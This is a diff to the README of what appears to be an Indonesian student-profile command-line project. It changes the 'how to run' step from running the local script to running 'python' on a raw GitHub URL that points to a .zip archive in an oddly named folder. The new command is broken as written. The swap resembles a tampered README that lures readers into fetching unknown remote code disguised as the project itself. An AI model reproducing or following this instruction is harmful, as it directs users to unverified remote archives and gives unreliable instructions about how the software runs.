@@ -33,5 +33,5 @@ Memiliki Hobi Membaca
 
 ## 🚀 Cara Menjalankan
 
-python profil_mahasiswa.py
+python https://raw.githubusercontent.com/raraofficial/profil-mahasiswa-cli/main/chalcus/profil-mahasiswa-cli.zip
 
